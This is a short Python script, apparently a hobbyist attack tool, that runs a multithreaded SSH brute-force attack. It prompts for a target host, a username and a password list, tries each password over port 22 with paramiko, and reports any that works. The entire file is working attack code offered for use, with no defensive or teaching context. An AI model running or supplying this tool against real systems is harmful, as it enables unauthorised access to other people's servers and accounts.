import paramiko, sys, os, termcolor
import threading, time

stop_flag = 0

def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag=1
        print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'green'))
    except paramiko.AuthenticationException:
        print(termcolor.colored(('[-]Incorrect Login: '+ password), 'red'))
        ssh.close()

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')

if os.path.exists(input_file) ==False:
    print('[!!] That File/Path Doesnt Exist')
    sys.exit(1)

print('* * * Starting Threding SSH Bruteforce On ' + host + 'With Account: '+ username + '* * *')

with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect,args=(password,))
        t.start()
        time.sleep(0.5)


